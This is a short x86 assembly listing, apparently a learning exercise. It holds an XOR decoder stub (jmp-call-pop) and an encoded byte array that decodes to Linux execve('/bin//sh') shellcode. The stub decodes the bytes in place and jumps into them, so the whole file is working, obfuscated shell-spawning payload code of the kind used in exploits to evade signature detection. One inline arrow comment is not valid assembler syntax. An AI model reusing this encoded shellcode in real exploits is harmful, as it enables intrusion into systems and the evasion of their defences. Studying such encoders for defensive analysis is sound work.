global _start

_start:
	jmp stage_1

stage_2:
	pop esi

stage_3:
	xor BYTE [esi], 0xAA
	jz shellcode <--- When 0xAA xor 0xAA the result will rise a zero. The program will jump to the decoded shellcode
	inc esi
	jmp stage_3

stage_1:
	call stage_2
	shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a, 0xaa ; <--- 0xaa is the marker
